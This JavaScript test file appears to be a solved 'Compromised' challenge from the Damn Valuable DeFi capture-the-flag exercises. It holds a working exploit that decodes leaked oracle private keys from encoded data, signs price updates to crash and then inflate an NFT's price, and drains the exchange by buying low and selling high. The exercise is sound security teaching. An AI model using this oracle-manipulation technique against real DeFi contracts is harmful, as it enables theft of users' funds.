const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());

        // Keep track of attacker's initial ETH balance
        this.initialAttackerbalance = await balance.current(attacker);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        let data1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
        let hexDocoded1 = Buffer.from(data1.split(" ").join(""), "hex").toString();
        let base64Decoded1 = Buffer.from(hexDocoded1, "base64").toString();

        let data2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
        let hexDocoded2 = Buffer.from(data2.split(" ").join(""), "hex").toString();
        let base64Decoded2 = Buffer.from(hexDocoded2, "base64").toString();

        let key1 = base64Decoded1.substr(2);
        let key2 = base64Decoded2.substr(2);

        let manipulate = async (amount, key, nonce) => {
            let data = web3.eth.abi.encodeFunctionCall({
                name: "postPrice",
                type: "function",
                inputs: [{
                    type: "string",
                    name: "symbol"
                }, {
                    type: "uint256",
                    name: "newPrice"
                }]
            }, ["DVNFT", ether(amount.toString()).toString()]);

            let tx = {
                to: this.oracle.address,
                gas: 3e6,
                nonce: nonce,
                data: data
            };

            await web3.eth.accounts.signTransaction(tx, key).then(async signed => {
                await web3.eth.sendSignedTransaction(signed.rawTransaction);
            });
        }

        await manipulate(1, key1, 0);
        await manipulate(1, key2, 0);

        let result = await this.exchange.buyOne({ value: web3.utils.toWei("1"), from: attacker });
        let tokenId = result.receipt.logs[0].args['tokenId'].toString();

        await manipulate(10001, key1, 1);
        await manipulate(10001, key2, 1);

        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
        await this.exchange.sellOne(tokenId, { from: attacker });
    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
    });
});
